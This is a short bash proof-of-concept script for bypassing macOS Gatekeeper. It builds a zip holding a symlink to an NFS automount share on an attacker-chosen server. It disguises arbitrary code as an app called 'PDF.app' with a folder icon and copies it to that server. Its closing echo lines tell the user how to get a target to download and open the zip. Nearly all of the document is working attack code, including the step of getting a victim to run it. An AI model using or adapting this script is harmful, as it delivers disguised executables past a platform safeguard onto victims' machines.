#!/bin/bash

if [ ! $# == 2 ]; then
    echo "Proper Usage PoCStage2-AttackMac.sh <IP Address Remote NFS Server> <path to file Containing Code want to run>"
    exit
fi

#create a zip file with a symlink to an automount endpoint
  mkdir ~/Desktop/GateKeeper/
  cd ~/Desktop/GateKeeper/
  mkdir Documents
  ln -s /net/$1/nfs/Documents Documents/Documents
  zip -ry Documents.zip Documents


#create an application (.app folder) with the code you want to run
  cp -r /Applications/Calculator.app PDF.app 
  cp $2 PDF.app/Contents/MacOS/Calculator
  chmod +x PDF.app/Contents/MacOS/Calculator
  rm PDF.app/Contents/Resources/AppIcon.icns
  ln -s /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/GenericFolderIcon.icns PDF.app/Contents/Resources/AppIcon.icns

#Copy maliicious app to remote server
  echo "Enter password for remote NFS Server"
  scp -r PDF.app root@$1:/nfs/Documents/PDF.app

# Execute for PoC or get target to
echo "Upload the zip somewhere online (web server or file.io ,etc..) and download it so it gets the quarantine flag used by Gatekeeper"
echo "Extract the zip (if needed...not Safari) and navigate it"
